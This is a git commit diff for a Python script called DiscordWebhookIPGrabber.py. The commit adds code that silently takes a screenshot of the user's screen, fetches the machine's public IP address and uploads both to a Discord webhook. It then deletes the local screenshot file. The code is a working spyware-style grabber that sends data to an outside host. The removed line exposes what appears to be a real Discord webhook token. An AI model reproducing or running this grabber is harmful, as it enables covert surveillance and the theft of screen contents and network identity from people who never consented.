07a6967030a93bca022fd6a2b7da24b118c68045
ichbaum8 <116547421+ichbaum8@users.noreply.github.com>
2024-02-07 11:36:46 +0100

    Updated DiscordWebhookIPGrabber.py
    Added Embed which shows Public-IP Adress.

--- DiscordWebhookIPGrabber.py
+++ DiscordWebhookIPGrabber.py
@@ -1,29 +1,46 @@
-import os
-import time
 import pyautogui
+import os
+import tempfile
+import requests
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
 def take_screenshot():
     screenshot = pyautogui.screenshot()
 
-    screenshot_path = "screenshot.png"
+    temp_dir = tempfile.gettempdir()
+    screenshot_path = os.path.join(temp_dir, "screenshot.png")
     screenshot.save(screenshot_path)
 
     return screenshot_path
 
-def send_to_discord(webhook_url, screenshot_path):
+def get_public_ip():
+    response = requests.get('https://api.ipify.org/?format=json')
+    ip_data = response.json()
+    public_ip = ip_data['ip']
+    return public_ip
+
+def send_to_discord(webhook_url, screenshot_path, public_ip):
     webhook = DiscordWebhook(url=webhook_url)
 
     with open(screenshot_path, "rb") as file:
         webhook.add_file(file=file.read(), filename='screenshot.png')
 
+    embed = DiscordEmbed(title='Screenshot mit öffentlicher IP-Adresse', description=f'Die öffentliche IP-Adresse lautet: {public_ip}', color=242424)
+    
+    webhook.add_embed(embed)
+
     response = webhook.execute()
 
-    print("Screenshot erfolgreich an Discord gesendet!")
+    print("Screenshot und Embed mit öffentlicher IP-Adresse erfolgreich an Discord gesendet!")
+
+    os.remove(screenshot_path)
+    print("Screenshot erfolgreich gelöscht!")
 
 if __name__ == "__main__":
-    webhook_url = 'https://discord.com/api/webhooks/1180930073373712454/jkYAfKmaECvJeo9kK32Ln_5X-ucBoOStaoEs_Y6E7UpJqEXoXuno3YN-nwG1mlp7qp6O'
+    webhook_url = 'your_url'
 
     screenshot_path = take_screenshot()
 
-    send_to_discord(webhook_url, screenshot_path)
+    public_ip = get_public_ip()
+
+    send_to_discord(webhook_url, screenshot_path, public_ip)
